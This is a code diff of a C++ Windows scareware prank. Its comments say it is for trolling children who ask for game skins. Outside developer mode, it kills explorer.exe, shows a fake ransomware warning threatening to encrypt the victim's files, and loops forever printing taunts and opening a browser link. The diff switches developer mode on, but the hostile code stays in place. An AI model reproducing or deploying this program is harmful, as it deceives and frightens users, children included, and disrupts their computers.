@@ -4,37 +4,49 @@
 #include <Windows.h>
 #include <shellapi.h>
 #include <iostream>
+#include <Lmcons.h>
+#include <random>
+
+
 
 //This is harmless, but to the 9 year old in rift, their pc is fucked.
 //Dont use this to harm anyone. Just to troll children :D
 
-bool bDeveloper = false;
+bool bDeveloper = true;
+HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
+
+int RandomInt(int max = 100)
+{
+	//https://stackoverflow.com/questions/13445688/how-to-generate-a-random-number-in-c
+	std::random_device dev;
+	std::mt19937 rng(dev());
+	std::uniform_int_distribution<std::mt19937::result_type> dist6(1, max);
+
+	return dist6(rng);
+}
 
 void SpamShit()
 {
+	SetConsoleTextAttribute(hConsole, RandomInt(15));
 	std::cout << "GET FUCKED LMFAOO\n";
+	SetConsoleTextAttribute(hConsole, RandomInt(15));
 	std::cout << "NEXT TIME DON'T ASK FOR SKINS\n";
-	ShellExecute(NULL, NULL, L"https://www.youtube.com/watch?v=iik25wqIuFo&ab_channel=Rickroll%2Cbutwithadifferentlink", NULL, NULL, SW_SHOWNORMAL);
+
+	if (!bDeveloper)
+		ShellExecute(NULL, NULL, L"https://www.youtube.com/watch?v=iik25wqIuFo&ab_channel=Rickroll%2Cbutwithadifferentlink", NULL, NULL, SW_SHOWNORMAL);
 }
 
 int main()
 {
-	system("Color 0C");
-
 	if (!bDeveloper)
-		system("taskkill /IM explorer.exe /F");
-
-	if (!bDeveloper)
-		MessageBoxA(nullptr, "Your Computer is Infected. If you close this window, all your files will be Encrypted. Press OK to enjoy the last 5 minutes of your pc ;)", "skīñś", MB_OK);
-
-	if (bDeveloper)
-		SpamShit();
-	else
 	{
-	LoadShit:
-		SpamShit();
-		goto LoadShit;
+		system("taskkill /IM explorer.exe /F");
+		MessageBoxA(nullptr, "Your Computer is Infected. If you close this window, all your files will be Encrypted. Press OK to enjoy the last 5 minutes of your pc ;)", "skīñś", MB_OK);
 	}
+
+LoadShit:
+	SpamShit();
+	goto LoadShit;
 
 	return 0;
 }
